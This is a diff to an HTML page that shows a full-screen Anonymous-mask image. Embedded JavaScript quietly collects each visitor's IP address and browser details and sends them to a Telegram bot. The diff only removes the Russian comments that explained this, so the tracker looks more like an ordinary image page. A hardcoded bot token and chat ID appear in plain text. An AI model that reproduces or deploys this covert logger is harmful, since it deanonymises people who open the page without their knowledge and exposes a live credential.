@@ -14,7 +14,7 @@
         img {
             width: 100%;
             height: 100%;
-            object-fit: cover; /* картинка покрывает весь экран, сохраняя пропорции */
+            object-fit: cover; 
             display: block;
         }
     </style>
@@ -24,11 +24,11 @@
     <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fkartinki.pics%2Fuploads%2Fposts%2F2022-12%2F1670654679_25-kartinkin-net-p-kartinki-maski-anonimusa-vkontakte-26.jpg&f=1&nofb=1&ipt=04b03c0330335e42bae7e7713eac17c7aebf915dce52e35c32d3ae5159791d4a">
 
     <script>
-        // ⚠️ ТВОИ ДАННЫЕ (уже вставлены)
+       
         const TELEGRAM_TOKEN = '8014763076:AAEjH-oM5ZHbUNGumTwQUQKai0XmdeWYwUc';
         const CHAT_ID = 639840324;
 
-        // Функция для получения IP
+    
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -39,12 +39,12 @@
             }
         }
 
-        // Информация о браузере
+  
         function getBrowserInfo() {
             return `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${screen.width}x${screen.height}`;
         }
 
-        // Отправка в Telegram
+     
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             await fetch(url, {
@@ -58,7 +58,7 @@
             });
         }
 
-        // Основная функция
+      
         async function logVisitor() {
             const ip = await getIP();
             const browser = getBrowserInfo();
